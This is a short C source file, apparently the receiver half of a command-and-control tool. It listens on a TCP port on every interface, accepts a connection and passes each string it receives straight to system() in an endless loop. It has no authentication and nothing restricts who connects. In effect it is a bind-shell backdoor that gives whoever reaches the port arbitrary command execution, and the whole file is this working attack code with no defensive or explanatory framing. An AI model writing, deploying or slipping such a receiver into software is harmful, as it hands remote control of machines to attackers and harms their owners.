#include "cc_receiver.h"

void execute_command(char *cmd) {
    // Execute the received command using system()
    system(cmd);
}

int start_receiver() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[MAX_CMD_SIZE] = {0};

    // Create a new socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket creation failed");
        return EXIT_FAILURE;
    }

    // Set socket options
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("Setsockopt");
        return EXIT_FAILURE;
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Bind the socket to the address
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        return EXIT_FAILURE;
    }

    // Listen for incoming connections
    if (listen(server_fd, 3) < 0) {
        perror("Listen");
        return EXIT_FAILURE;
    }

    // Accept an incoming connection
    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen)) < 0) {
        perror("Accept");
        return EXIT_FAILURE;
    }

    // Main loop to receive commands
    while (1) {
        read(new_socket, buffer, MAX_CMD_SIZE);
        printf("Received command: %s\n", buffer);

        // Execute the received command
        execute_command(buffer);

        // Clear the buffer
        memset(buffer, 0, MAX_CMD_SIZE);
    }

    return EXIT_SUCCESS;
}
